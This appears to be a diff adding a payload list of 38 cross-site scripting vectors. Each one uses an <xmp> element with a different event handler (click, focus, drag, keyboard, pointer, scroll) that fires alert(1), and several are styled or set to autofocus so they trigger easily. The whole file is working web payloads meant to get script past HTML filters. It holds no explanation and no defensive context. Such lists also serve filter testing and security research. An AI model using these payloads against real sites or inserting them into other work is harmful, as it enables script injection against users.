@@ -1,0 +1,38 @@
+<xmp contenteditable onbeforeinput=alert(1)>test
+<xmp draggable="true" ondrag="alert(1)" style=display:block>test</xmp>
+<xmp draggable="true" ondragend="alert(1)" style=display:block>test</xmp>
+<xmp draggable="true" ondragenter="alert(1)" style=display:block>test</xmp>
+<xmp draggable="true" ondragleave="alert(1)" style=display:block>test</xmp>
+<xmp draggable="true" ondragstart="alert(1)" style=display:block>test</xmp>
+<xmp id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xmp>
+<xmp id=x tabindex=1 onfocus=alert(1)></xmp>
+<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
+<xmp onafterscriptexecute=alert(1)><script>1</script>
+<xmp onbeforescriptexecute=alert(1)><script>1</script>
+<xmp onblur=alert(1) id=x tabindex=1 style=display:block>test</xmp><input value=clickme>
+<xmp onclick="alert(1)" style=display:block>test</xmp>
+<xmp oncontextmenu="alert(1)" style=display:block>test</xmp>
+<xmp oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<xmp oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<xmp ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xmp>
+<xmp onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xmp><input value=clickme>
+<xmp onkeydown="alert(1)" contenteditable style=display:block>test</xmp>
+<xmp onkeypress="alert(1)" contenteditable style=display:block>test</xmp>
+<xmp onkeyup="alert(1)" contenteditable style=display:block>test</xmp>
+<xmp onmousedown="alert(1)" style=display:block>test</xmp>
+<xmp onmouseenter="alert(1)" style=display:block>test</xmp>
+<xmp onmouseleave="alert(1)" style=display:block>test</xmp>
+<xmp onmousemove="alert(1)" style=display:block>test</xmp>
+<xmp onmouseout="alert(1)" style=display:block>test</xmp>
+<xmp onmouseover="alert(1)" style=display:block>test</xmp>
+<xmp onmouseup="alert(1)" style=display:block>test</xmp>
+<xmp onmousewheel=alert(1) style=display:block>requires scrolling
+<xmp onpointerdown=alert(1) style=display:block>XSS</xmp>
+<xmp onpointerenter=alert(1) style=display:block>XSS</xmp>
+<xmp onpointerleave=alert(1) style=display:block>XSS</xmp>
+<xmp onpointermove=alert(1) style=display:block>XSS</xmp>
+<xmp onpointerout=alert(1) style=display:block>XSS</xmp>
+<xmp onpointerover=alert(1) style=display:block>XSS</xmp>
+<xmp onpointerrawupdate=alert(1) style=display:block>XSS</xmp>
+<xmp onpointerup=alert(1) style=display:block>XSS</xmp>
+<xmp onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xmp>
